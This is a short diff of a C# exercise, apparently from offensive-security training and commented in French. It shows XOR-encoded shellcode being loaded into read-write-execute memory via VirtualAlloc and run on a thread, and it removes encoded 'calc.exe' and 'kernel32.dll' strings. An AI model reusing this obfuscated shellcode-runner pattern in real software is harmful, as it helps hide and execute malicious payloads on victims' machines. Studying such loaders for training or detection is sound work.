@@ -65,14 +65,7 @@ namespace Exercice3
 0xc0, 0x94, 0xf5, 0xe8, 0xed, 0x87, 0xde, 0xc6, 0x0e, 0x5d, 0x78, 0x52, 0xe4, 0xe6, 0xeb,
 0xe4, 0xa9, 0xe2, 0xff, 0xe2, 0x87
 };
-            byte[] calcEnc = new byte[8] {
-0xe4, 0xe6, 0xeb, 0xe4, 0xa9, 0xe2, 0xff, 0xe2
-};
-            byte[] kernel32Enc = new byte[12] {
-0xec, 0xe2, 0xf5, 0xe9, 0xe2, 0xeb, 0xb4, 0xb5, 0xa9, 0xe3, 0xeb, 0xeb
-};
 
-            Process[] expProc = Process.GetProcessesByName(xorDechiffrementString(calcEnc));
             int scBuf = buffEnc.Length; //Pour avoir sa taille exacte en Bytes
             //Allocation mémoire pour l'executable (Il va pointer vers une zone mémoire vide MAIS exécutable
             IntPtr ptrAddr = VirtualAlloc(IntPtr.Zero, scBuf, COMMIT_RESERVE, EXECUTEREADWRITE);
@@ -82,4 +75,5 @@ namespace Exercice3
             uint waitResult = WaitForSingleObject(ptrThreadId, -1);
         }
     }
+
 }
